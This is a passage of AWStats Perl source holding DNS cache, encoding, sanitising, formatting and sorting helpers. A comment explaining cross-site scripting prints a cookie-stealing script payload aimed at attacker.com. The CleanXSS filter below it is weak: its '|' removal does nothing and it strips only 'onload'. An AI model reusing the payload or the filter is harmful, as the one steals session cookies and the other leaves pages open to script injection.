($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\tchmod 0666, \"$filetosave\";\n\t\t}\n\t}\n\tif ( !$nbofelemsaved ) {\n\t\t$filetosave = \"$dnscachefile$filesuffix$dnscacheext\";\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\" Save data \"\n\t\t\t\t  . (\n\t\t\t\t\t$nbofelemtosave\n\t\t\t\t\t? \"($nbofelemtosave records max)\"\n\t\t\t\t\t: \"(all records)\"\n\t\t\t\t  )\n\t\t\t\t  . \" into file $filetosave\"\n\t\t\t);\n\t\t}\n\t\tif ( !open( DNSFILE, \">$filetosave\" ) ) {\n\t\t\twarning(\n\"Warning: Failed to open for writing last update DNS Cache file \\\"$filetosave\\\": $!\"\n\t\t\t);\n\t\t\treturn 1;\n\t\t}\n\t\tbinmode DNSFILE;\n\t\tmy $starttimemin = int( $starttime / 60 );\n\t\tforeach my $key ( keys %$hashtosave ) {\n\n\t\t\t#if ($hashtosave->{$key} ne '*') {\n\t\t\tmy $ipsolved = $hashtosave->{$key};\n\t\t\tprint DNSFILE \"$starttimemin\\t$key\\t\"\n\t\t\t  . ( $ipsolved eq 'ip' ? '*' : $ipsolved )\n\t\t\t  . \"\\n\";    # Change 'ip' to '*' for backward compatibility\n\t\t\tif ( ++$nbofelemsaved >= $NBOFLASTUPDATELOOKUPTOSAVE ) { last; }\n\n\t\t\t#}\n\t\t}\n\t\tclose DNSFILE;\n\n\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\tchmod 0666, \"$filetosave\";\n\t\t}\n\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" Saved $nbofelemsaved items into $filetosave in \"\n\t\t\t  . ( time() - $timetosave )\n\t\t\t  . \" seconds.\",\n\t\t\t1\n\t\t);\n\t}\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return time elapsed since last call in miliseconds\n# Parameters:\t0|1 (0 reset counter, 1 no reset)\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\tNumber of miliseconds elapsed since last call\n#------------------------------------------------------------------------------\nsub GetDelaySinceStart {\n\tif (shift) { $StartSeconds = 0; }    # Reset chrono\n\tmy ( $newseconds, $newmicroseconds ) = ( time(), 0 );\n\n\t# Plugin call : Return seconds and milliseconds\n\tif ( $PluginsLoaded{'GetTime'}{'timehires'} ) {\n\t\tGetTime_timehires( $newseconds, $newmicroseconds );\n\t}\n\tif ( !$StartSeconds ) {\n\t\t$StartSeconds      = $newseconds;\n\t\t$StartMicroseconds = $newmicroseconds;\n\t}\n\treturn ( ( $newseconds - $StartSeconds ) * 1000 +\n\t\t  int( ( $newmicroseconds - $StartMicroseconds ) / 1000 ) );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Reset all variables whose name start with _ because a new month start\n# Parameters:\tNone\n# Input:        $YearRequired All variables whose name start with _\n# Output:       All variables whose name start with _\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Init_HashArray {\n\tif ($Debug) { debug(\"Call to Init_HashArray\"); }\n\n\t# Reset global hash arrays\n\t%FirstTime           = %LastTime           = ();\n\t%MonthHostsKnown     = %MonthHostsUnknown  = ();\n\t%MonthVisits         = %MonthUnique        = ();\n\t%MonthPages          = %MonthHits          = %MonthBytes = ();\n\t%MonthNotViewedPages = %MonthNotViewedHits = %MonthNotViewedBytes = ();\n\t%DayPages            = %DayHits            = %DayBytes = %DayVisits = ();\n\n\t# Reset all arrays with name beginning by _\n\tfor ( my $ix = 0 ; $ix < 6 ; $ix++ ) {\n\t\t$_from_p[$ix] = 0;\n\t\t$_from_h[$ix] = 0;\n\t}\n\tfor ( my $ix = 0 ; $ix < 24 ; $ix++ ) {\n\t\t$_time_h[$ix]    = 0;\n\t\t$_time_k[$ix]    = 0;\n\t\t$_time_p[$ix]    = 0;\n\t\t$_time_nv_h[$ix] = 0;\n\t\t$_time_nv_k[$ix] = 0;\n\t\t$_time_nv_p[$ix] = 0;\n\t}\n\n\t# Reset all hash arrays with name beginning by _\n\t%_session     = %_browser_h   = %_browser_p   = ();\n\t%_domener_p   = %_domener_h   = %_domener_k = %_errors_h = %_errors_k = ();\n\t%_filetypes_h = %_filetypes_k = %_filetypes_gz_in = %_filetypes_gz_out = ();\n\t%_host_p = %_host_h = %_host_k = %_host_l = %_host_s = %_host_u = ();\n\t%_waithost_e = %_waithost_l = %_waithost_s = %_waithost_u = ();\n\t%_keyphrases = %_keywords   = %_os_h = %_os_p = %_pagesrefs_p = %_pagesrefs_h =\n\t  %_robot_h  = %_robot_k    = %_robot_l = %_robot_r = ();\n\t%_worm_h = %_worm_k = %_worm_l = %_login_p = %_login_h = %_login_k =\n\t  %_login_l      = %_screensize_h   = ();\n\t%_misc_p         = %_misc_h         = %_misc_k = ();\n\t%_cluster_p      = %_cluster_h      = %_cluster_k = ();\n\t%_se_referrals_p = %_se_referrals_h = %_sider_h = %_referer_h = %_err_host_h =\n\t  %_url_p        = %_url_k          = %_url_e = %_url_x = ();\n\t%_downloads = ();\n\t%_unknownreferer_l = %_unknownrefererbrowser_l = ();\n\t%_emails_h = %_emails_k = %_emails_l = %_emailr_h = %_emailr_k =\n\t  %_emailr_l = ();\n\n\tfor ( my $ix = 1 ; $ix < @ExtraName ; $ix++ ) {\n\t\t%{ '_section_' . $ix . '_h' }   = %{ '_section_' . $ix . '_o' } =\n\t\t  %{ '_section_' . $ix . '_k' } = %{ '_section_' . $ix . '_l' } =\n\t\t  %{ '_section_' . $ix . '_p' } = ();\n\t}\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } )\n\t{\n\n\t\t#   \t\tmy $function=\"SectionInitHashArray_$pluginname()\";\n\t\t#   \t\teval(\"$function\");\n\t\tmy $function = \"SectionInitHashArray_$pluginname\";\n\t\t&$function();\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Change word separators of a keyphrase string into space and\n#               remove bad coded chars\n# Parameters:\tstringtodecode\n# Input:        None\n# Output:       None\n# Return:\t\tdecodedstring\n#------------------------------------------------------------------------------\nsub ChangeWordSeparatorsIntoSpace {\n\t$_[0] =~ s/%0[ad]/ /ig;          # LF CR\n\t$_[0] =~ s/%2[02789abc]/ /ig;    # space \" ' ( ) * + ,\n\t$_[0] =~ s/%3a/ /ig;             # :\n\t$_[0] =~\n\t  tr/\\+\\'\\(\\)\\\"\\*,:/        /s;    # \"&\" and \"=\" must not be in this list\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tTransforms special chars by entities as needed in XML/XHTML\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub XMLEncode {\n\tif ( $BuildReportFormat ne 'xhtml' && $BuildReportFormat ne 'xml' ) {\n\t\treturn shift;\n\t}\n\tmy $string = shift;\n\t$string =~ s/&/&amp;/g;\n\t$string =~ s/</&lt;/g;\n\t$string =~ s/>/&gt;/g;\n\t$string =~ s/\\\"/&quot;/g;\n\t$string =~ s/\\'/&apos;/g;\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tTransforms spaces into %20 and special chars by HTML entities as needed in XML/XHTML\n#\t\t\t\tDecoding is done by XMLDecodeFromHisto.\n#\t\t\t\tAWStats data files are stored in ISO-8859-1.\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub XMLEncodeForHisto {\n\tmy $string = shift;\n\t$string =~ s/\\s/%20/g;\n\tif ( $BuildHistoryFormat ne 'xml' ) { return $string; }\n\t$string =~ s/=/%3d/g;\n\t$string =~ s/&/&amp;/g;\n\t$string =~ s/</&lt;/g;\n\t$string =~ s/>/&gt;/g;\n\t$string =~ s/\\\"/&quot;/g;\n\t$string =~ s/\\'/&apos;/g;\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Encode an ISO string to PageCode output\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub EncodeToPageCode {\n\tmy $string = shift;\n\tif ( $PageCode eq 'utf-8' ) { $string = encode( \"utf8\", $string ); }\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Encode a binary string into an ASCII string\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub EncodeString {\n\tmy $string = shift;\n\n\t#\tuse bytes;\n\t$string =~ s/([\\x2B\\x80-\\xFF])/sprintf (\"%%%2x\", ord($1))/eg;\n\n\t#\tno bytes;\n\t$string =~ tr/ /+/s;\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Decode an url encoded text string into a binary string\n# Parameters:   stringtodecode\n# Input:        None\n# Output:       None\n# Return:       decodedstring\n#------------------------------------------------------------------------------\nsub DecodeEncodedString {\n\tmy $stringtodecode = shift;\n\t$stringtodecode =~ tr/\\+/ /s;\n\t$stringtodecode =~ s/%([A-F0-9][A-F0-9])/pack(\"C\", hex($1))/ieg;\n\t$stringtodecode =~ s/[\"']//g;\n\n\treturn $stringtodecode;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Decode a precompiled regex value to a common regex value\n# Parameters:   compiledregextodecode\n# Input:        None\n# Output:       None\n# Return:\t\tstandardregex\n#------------------------------------------------------------------------------\nsub UnCompileRegex {\n\tshift =~ /\\(\\?[-^\\w]*:(.*)\\)/;         # Works with all perl\n\t# shift =~ /\\(\\?[-\\w]*:(.*)\\)/;        < perl 5.14\n\treturn $1;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Clean a string of all chars that are not char or _ - \\ / . \\s\n# Parameters:   stringtoclean, full\n# Input:        None\n# Output:       None\n# Return:\t\tcleanedstring\n#------------------------------------------------------------------------------\nsub Sanitize {\n\tmy $stringtoclean = shift;\n\tmy $full = shift || 0;\n\tif ($full) {\n\t\t$stringtoclean =~ s/[^\\w\\d]//g;\n\t}\n\telse {\n\t\t$stringtoclean =~ s/[^\\w\\d\\-\\\\\\/\\.:\\s]//g;\n\t}\n\treturn $stringtoclean;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Clean a string of HTML tags to avoid 'Cross Site Scripting attacks'\n#               and clean | char.\n#\t\t\t\tA XSS attack is providing an AWStats url with XSS code that is executed\n#\t\t\t\twhen page loaded by awstats CGI is loaded from AWStats server. Such a code\n#\t\t\t\tcan be<script>document.write(\"<img src=http://attacker.com/page.php?\" + document.cookie)</script>\n#\t\t\t\tThis make the browser sending a request to the attacker server that contains\n#\t\t\t\tcookie used for AWStats server sessions. Attacker can this way caught this\n#\t\t\t\tcookie and used it to go on AWStats server like original visitor. For this\n#\t\t\t\tresaon, parameter received by AWStats must be sanitized by this function\n#\t\t\t\tbefore being put inside a web page.\n# Parameters:   stringtoclean\n# Input:        None\n# Output:       None\n# Return:\t\tcleanedstring\n#------------------------------------------------------------------------------\nsub CleanXSS {\n\tmy $stringtoclean = shift;\n\n\t# To avoid html tags and javascript\n\t$stringtoclean =~ s/</&lt;/g;\n\t$stringtoclean =~ s/>/&gt;/g;\n\t$stringtoclean =~ s/|//g;\n\n\t# To avoid onload=\"\n\t$stringtoclean =~ s/onload//g;\n\treturn $stringtoclean;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Clean tags in a string\n#\t\t\t\tAWStats data files are stored in ISO-8859-1.\n# Parameters:   stringtodecode\n# Input:        None\n# Output:       None\n# Return:\t\tdecodedstring\n#------------------------------------------------------------------------------\nsub XMLDecodeFromHisto {\n\tmy $stringtoclean = shift;\n\t$stringtoclean =~ s/$regclean1/ /g;    # Replace <recnb> or </td> with space\n\t$stringtoclean =~ s/$regclean2//g;     # Remove others <xxx>\n\t$stringtoclean =~ s/%3d/=/g;\n\t$stringtoclean =~ s/&amp;/&/g;\n\t$stringtoclean =~ s/&lt;/</g;\n\t$stringtoclean =~ s/&gt;/>/g;\n\t$stringtoclean =~ s/&quot;/\\\"/g;\n\t$stringtoclean =~ s/&apos;/\\'/g;\n\treturn $stringtoclean;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Copy one file into another\n# Parameters:   sourcefilename targetfilename\n# Input:        None\n# Output:       None\n# Return:\t\t0 if copy is ok, 1 else\n#------------------------------------------------------------------------------\nsub FileCopy {\n\tmy $filesource = shift;\n\tmy $filetarget = shift;\n\tif ($Debug) { debug( \"FileCopy($filesource,$filetarget)\", 1 ); }\n\topen( FILESOURCE, \"$filesource\" )  || return 1;\n\topen( FILETARGET, \">$filetarget\" ) || return 1;\n\tbinmode FILESOURCE;\n\tbinmode FILETARGET;\n\n\t# ...\n\tclose(FILETARGET);\n\tclose(FILESOURCE);\n\tif ($Debug) { debug( \" File copied\", 1 ); }\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Format a QUERY_STRING\n# Parameters:   query\n# Input:        None\n# Output:       None\n# Return:\t\tformatted query\n#------------------------------------------------------------------------------\n# TODO Appeller cette fonction partout ou il y a des NewLinkParams\nsub CleanNewLinkParamsFrom {\n\tmy $NewLinkParams = shift;\n\twhile ( my $param = shift ) {\n\t\t$NewLinkParams =~ s/(^|&|&amp;)$param(=[^&]*|$)//i;\n\t}\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\treturn $NewLinkParams;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Show flags for other language translations\n# Parameters:   Current languade id (en, fr, ...)\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub Show_Flag_Links {\n\tmy $CurrentLang = shift;\n\n\t# Build flags link\n\tmy $NewLinkParams = $QueryString;\n\tmy $NewLinkTarget = '';\n\tif ( $ENV{'GATEWAY_INTERFACE'} ) {\n\t\t$NewLinkParams =\n\t\t  CleanNewLinkParamsFrom( $NewLinkParams,\n\t\t\t( 'update', 'staticlinks', 'framename', 'lang' ) );\n\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)lang=[^&]*//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\n\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t\t}\n\t}\n\telse {\n\t\t$NewLinkParams =\n\t\t  ( $SiteConfig ? \"config=$SiteConfig&amp;\" : \"\" )\n\t\t  . \"year=$YearRequired&amp;month=$MonthRequired&amp;\";\n\t}\n\tif ( $NewLinkParams !~ /output=/ ) { $NewLinkParams .= 'output=main&amp;'; }\n\tif ( $FrameName eq 'mainright' ) {\n\t\t$NewLinkParams .= 'framename=index&amp;';\n\t}\n\n\tforeach my $lng ( split( /\\s+/, $ShowFlagLinks ) ) {\n\t\t$lng =\n\t\t    $LangBrowserToLangAwstats{$lng}\n\t\t  ? $LangBrowserToLangAwstats{$lng}\n\t\t  : $lng;\n\t\tif ( $lng ne $CurrentLang ) {\n\t\t\tmy %lngtitle = (\n\t\t\t\t'en', 'English', 'fr', 'French', 'de', 'German',\n\t\t\t\t'it', 'Italian', 'nl', 'Dutch',  'es', 'Spanish'\n\t\t\t);\n\t\t\tmy $lngtitle = ( $lngtitle{$lng} ? $lngtitle{$lng} : $lng );\n\t\t\tmy $flag = (\n\t\t\t\t  $LangAWStatsToFlagAwstats{$lng}\n\t\t\t\t? $LangAWStatsToFlagAwstats{$lng}\n\t\t\t\t: $lng\n\t\t\t);\n\t\t\tprint \"<a href=\\\"\"\n\t\t\t  . XMLEncode(\"$AWScript${NewLinkParams}lang=$lng\")\n\t\t\t  . \"\\\"$NewLinkTarget><img src=\\\"$DirIcons\\/flags\\/$flag.png\\\" height=\\\"14\\\" border=\\\"0\\\"\"\n\t\t\t  . AltTitle(\"$lngtitle\")\n\t\t\t  . \" /></a>&nbsp;\\n\";\n\t\t}\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tFormat value in bytes in a string (Bytes, Kb, Mb, Gb)\n# Parameters:   bytes (integer value or \"0.00\")\n# Input:        None\n# Output:       None\n# Return:       \"x.yz MB\" or \"x.yy KB\" or \"x Bytes\" or \"0\"\n#------------------------------------------------------------------------------\nsub Format_Bytes {\n\tmy $bytes = shift || 0;\n\tmy $fudge = 1;\n\n# Do not use exp/log function to calculate 1024power, function make segfault on some unix/perl versions\n\tif ( $bytes >= ( $fudge << 30 ) ) {\n\t\treturn sprintf( \"%.2f\", $bytes / 1073741824 ) . \" $Message[110]\";\n\t}\n\tif ( $bytes >= ( $fudge << 20 ) ) {\n\t\treturn sprintf( \"%.2f\", $bytes / 1048576 ) . \" $Message[109]\";\n\t}\n\tif ( $bytes >= ( $fudge << 10 ) ) {\n\t\treturn sprintf( \"%.2f\", $bytes / 1024 ) . \" $Message[108]\";\n\t}\n\tif ( $bytes < 0 ) { $bytes = \"?\"; }\n\treturn int($bytes) . ( int($bytes) ? \" $Message[119]\" : \"\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tFormat a number with commas or any other separator\n#\t\t\t\tCL: courtesy of http://www.perlmonks.org/?node_id=2145\n# Parameters:   number\n# Input:        None\n# Output:       None\n# Return:       \"999,999,999,999\"\n#------------------------------------------------------------------------------\nsub Format_Number {\n\tmy $number = shift || 0;\n\t$number =~ s/(\\d)(\\d\\d\\d)$/$1 $2/;\n\t$number =~ s/(\\d)(\\d\\d\\d\\s\\d\\d\\d)$/$1 $2/;\n\t$number =~ s/(\\d)(\\d\\d\\d\\s\\d\\d\\d\\s\\d\\d\\d)$/$1 $2/;\n\tmy $separator = $Message[177];\n\tif ($separator eq '') { $separator=' '; }\t# For backward compatibility\n\t$number =~ s/ /$separator/g;\n\treturn $number;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tReturn \" alt=string title=string\"\n# Parameters:   string\n# Input:        None\n# Output:       None\n# Return:       \"alt=string title=string\"\n#------------------------------------------------------------------------------\nsub AltTitle {\n\tmy $string = shift || '';\n\treturn \" alt='$string' title='$string'\";\n\n\t#\treturn \" alt=\\\"$string\\\" title=\\\"$string\\\"\";\n\t#\treturn ($BuildReportFormat?\"\":\" alt=\\\"$string\\\"\").\" title=\\\"$string\\\"\";\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tTell if an email is a local or external email\n# Parameters:   email\n# Input:        $SiteDomain(exact string) $HostAliases(quoted regex string)\n# Output:       None\n# Return:       -1, 0 or 1\n#------------------------------------------------------------------------------\nsub IsLocalEMail {\n\tmy $email = shift || 'unknown';\n\tif ( $email !~ /\\@(.*)$/ ) { return 0; }\n\tmy $domain = $1;\n\tif ( $domain =~ /^$SiteDomain$/i ) { return 1; }\n\tforeach (@HostAliases) {\n\t\tif ( $domain =~ /$_/ ) { return 1; }\n\t}\n\treturn -1;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tFormat a date according to Message[78] (country date format)\n# Parameters:   String date YYYYMMDDHHMMSS\n#               Option 0=LastUpdate and LastTime date\n#                      1=Arrays date except daymonthvalues\n#                      2=daymonthvalues date (only year month and day)\n# Input:        $Message[78]\n# Output:       None\n# Return:       Date with format defined by Message[78] and option\n#------------------------------------------------------------------------------\nsub Format_Date {\n\tmy $date       = shift;\n\tmy $option     = shift || 0;\n\tmy $year       = substr( \"$date\", 0, 4 );\n\tmy $month      = substr( \"$date\", 4, 2 );\n\tmy $day        = substr( \"$date\", 6, 2 );\n\tmy $hour       = substr( \"$date\", 8, 2 );\n\tmy $min        = substr( \"$date\", 10, 2 );\n\tmy $sec        = substr( \"$date\", 12, 2 );\n\tmy $dateformat = $Message[78];\n\n\tif ( $option == 2 ) {\n\t\t$dateformat =~ s/^[^ymd]+//g;\n\t\t$dateformat =~ s/[^ymd]+$//g;\n\t}\n\t$dateformat =~ s/yyyy/$year/g;\n\t$dateformat =~ s/yy/$year/g;\n\t$dateformat =~ s/mmm/$MonthNumLib{$month}/g;\n\t$dateformat =~ s/mm/$month/g;\n\t$dateformat =~ s/dd/$day/g;\n\t$dateformat =~ s/HH/$hour/g;\n\t$dateformat =~ s/MM/$min/g;\n\t$dateformat =~ s/SS/$sec/g;\n\treturn \"$dateformat\";\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return 1 if string contains only ascii chars\n# Parameters:   string\n# Input:        None\n# Output:       None\n# Return:       0 or 1\n#------------------------------------------------------------------------------\nsub IsAscii {\n\tmy $string = shift;\n\tif ($Debug) { debug( \"IsAscii($string)\", 5 ); }\n\tif ( $string =~ /^[\\w\\+\\-\\/\\\\\\.%,;:=\\\"\\'&?!\\s]+$/ ) {\n\t\tif ($Debug) { debug( \" Yes\", 6 ); }\n\t\treturn\n\t\t  1\n\t\t  ; # Only alphanum chars (and _) or + - / \\ . % , ; : = \" ' & ? space \\t\n\t}\n\tif ($Debug) { debug( \" No\", 6 ); }\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return the lower value between 2 but exclude value if 0\n# Parameters:   Val1 and Val2\n# Input:        None\n# Output:       None\n# Return:       min(Val1,Val2)\n#------------------------------------------------------------------------------\nsub MinimumButNoZero {\n\tmy ( $val1, $val2 ) = @_;\n\treturn ( $val1 && ( $val1 < $val2 || !$val2 ) ? $val1 : $val2 );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Add a val from sorting tree\n# Parameters:   keytoadd keyval [firstadd]\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub AddInTree {\n\tmy $keytoadd = shift;\n\tmy $keyval   = shift;\n\tmy $firstadd = shift || 0;\n\tif ( $firstadd == 1 ) {    # Val is the first one\n\t\tif ($Debug) { debug( \"  firstadd\", 4 ); }\n\t\t$val{$keyval} = $keytoadd;\n\t\t$lowerval = $keyval;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t\t  . ( scalar keys %val )\n\t\t\t\t  . \", nb elem egal=\"\n\t\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\treturn;\n\t}\n\tif ( $val{$keyval} ) {    # Val is already in tree\n\t\tif ($Debug) { debug( \"  val is already in tree\", 4 ); }\n\t\t$egal{$keytoadd} = $val{$keyval};\n\t\t$val{$keyval}    = $keytoadd;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t\t  . ( scalar keys %val )\n\t\t\t\t  . \", nb elem egal=\"\n\t\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\treturn;\n\t}\n\tif ( $keyval <= $lowerval )\n\t{    # Val is a new one lower (should happens only when tree is not full)\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"  keytoadd val=$keyval is lower or equal to lowerval=$lowerval\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\t$val{$keyval}     = $keytoadd;\n\t\t$nextval{$keyval} = $lowerval;\n\t\t$lowerval         = $keyval;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t\t  . ( scalar keys %val )\n\t\t\t\t  . \", nb elem egal=\"\n\t\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\treturn;\n\t}\n\n\t# Val is a new one higher\n\tif ($Debug) {\n\t\tdebug( \"  keytoadd val=$keyval is higher than lowerval=$lowerval\", 4 );\n\t}\n\t$val{$keyval} = $keytoadd;\n\tmy $valcursor = $lowerval;    # valcursor is value just before keyval\n\twhile ( $nextval{$valcursor} && ( $nextval{$valcursor} < $keyval ) ) {\n\t\t$valcursor = $nextval{$valcursor};\n\t}\n\tif ( $nextval{$valcursor} )\n\t{    # keyval is between valcursor and nextval{valcursor}\n\t\t$nextval{$keyval} = $nextval{$valcursor};\n\t}\n\t$nextval{$valcursor} = $keyval;\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t  . ( scalar keys %val )\n\t\t\t  . \", nb elem egal=\"\n\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t4\n\t\t);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Remove a val from sorting tree\n# Parameters:   None\n# Input:        $lowerval %val %egal\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub Removelowerval {\n\tmy $keytoremove = $val{$lowerval};    # This is lower key\n\tif ($Debug) {\n\t\tdebug( \"   remove for lowerval=$lowerval: key=$keytoremove\", 4 );\n\t}\n\tif ( $egal{$keytoremove} ) {\n\t\t$val{$lowerval} = $egal{$keytoremove};\n\t\tdelete $egal{$keytoremove};\n\t}\n\telse {\n\t\tdelete $val{$lowerval};\n\t\t$lowerval = $nextval{$lowerval};    # Set new lowerval\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"   new lower value=$lowerval, val size=\"\n\t\t\t  . ( scalar keys %val )\n\t\t\t  . \", egal size=\"\n\t\t\t  . ( scalar keys %egal ),\n\t\t\t4\n\t\t);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Build @keylist array\n# Parameters:   Size max for @keylist array,\n#               Min value in hash for select,\n#               Hash used for select,\n#               Hash used for order\n# Input:        None\n# Output:       None\n# Return:       @keylist response array\n#------------------------------------------------------------------------------\nsub BuildKeyList {\n\tmy $ArraySize = shift || error(\n\"System error. Call to BuildKeyList function with incorrect value for first param\",\n\t\t\"\", \"\", 1\n\t);\n\tmy $MinValue = shift || error(\n\"System error. Call to BuildKeyList function with incorrect value for second param\",\n\t\t\"\", \"\", 1\n\t);\n\tmy $hashforselect = shift;\n\tmy $hashfororder  = shift;\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"  BuildKeyList($ArraySize,$MinValue,$hashforselect with size=\"\n\t\t\t  . ( scalar keys %$hashforselect )\n\t\t\t  . \",$hashfororder with size=\"\n\t\t\t  . ( scalar keys %$hashfororder ) . \")\",\n\t\t\t3\n\t\t);\n\t}\n\tdelete $hashforselect->{0};\n\tdelete $hashforselect->{ ''\n\t  }; # Those is to protect from infinite loop when hash array has an incorrect null key\n\tmy $count = 0;\n\t$lowerval = 0;    # Global because used in AddInTree and Removelowerval\n\t%val      = ();\n\t%nextval  = ();\n\t%egal     = ();\n\n\tforeach my $key ( keys %$hashforselect ) {\n\t\tif ( $count < $ArraySize ) {\n\t\t\tif ( $hashforselect->{$key} >= $MinValue ) {\n\t\t\t\t$count++;\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\t\t\t\t\t\t\"  Add in tree entry $count : $key (value=\"\n\t\t\t\t\t\t  . ( $hashfororder->{$key} || 0 )\n\t\t\t\t\t\t  . \", tree not full)\",\n\t\t\t\t\t\t4\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tAddInTree( $key, $hashfororder->{$key} || 0, $count );\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\t$count++;\n\t\tif ( ( $hashfororder->{$key} || 0 ) <= $lowerval ) { next; }\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  Add in tree entry $count : $key (value=\"\n\t\t\t\t  . ( $hashfororder->{$key} || 0 )\n\t\t\t\t  . \" > lowerval=$lowerval)\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\tAddInTree( $key, $hashfororder->{$key} || 0 );\n\t\tif ($Debug) { debug( \"  Removelower in tree\", 4 ); }\n\t\tRemovelowerval();\n\t}\n\n\t# Build key list and sort it\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"  Build key list and sort it. lowerval=$lowerval, nb elem val=\"\n\t\t\t  . ( scalar keys %val )\n\t\t\t  . \", nb elem egal=\"\n\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t3\n\t\t);\n\t}\n\tmy %notsortedkeylist = ();\n\tforeach my $key ( values %val )  { $notsortedkeylist{$key} = 1; }\n\tforeach my $key ( values %egal ) { $notsortedkeylist{$key} = 1; }\n\t@keylist = ();\n\t@keylist = (\n\t\tsort { ( $hashfororder->{$b} || 0 ) <=> ( $hashfororder->{$a} || 0 ) }\n\t\t  keys %notsortedkeylist\n\t);\n\tif ($Debug) {\n\t\tdebug( \"  BuildKeyList End (keylist size=\" . (@keylist) . \")\", 3 );\n\t}\n\treturn;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Lock or unlock update\n# Parameters:   status (1 to lock, 0 to unlock)\n# Input:        $DirLock (if status=0) $PROG $FileSuffix\n# Output:       $DirLock (if status=1)\n# Return:       None\n#------------------------------------------------------------------------------\nsub Lock_Update {\n\tmy $status = shift;\n\tmy $lock   = \"$PROG$FileSuffix.lock\";\n\tif ($status) {\n\n\t\t# We stop if there is at least one lock file wherever it is\n\t\tforeach my $key ( $ENV{\"TEMP\"}, $ENV{\"TMP\"}, \"/tmp\", \"/\", \".\" ) {\n\t\t\tmy $newkey = $key;\n\t\t\t$newkey =~ s/[\\\\\\/]$//;\n\t\t\tif ( -f \"$newkey/$lock\" ) {\n\t\t\t\terror(\n\"An AWStats update process seems to be already running for this config file. Try later.\\nIf this is not true, remove manually lock file '$newkey/$lock'.\",\n\t\t\t\t\t\"\", \"\", 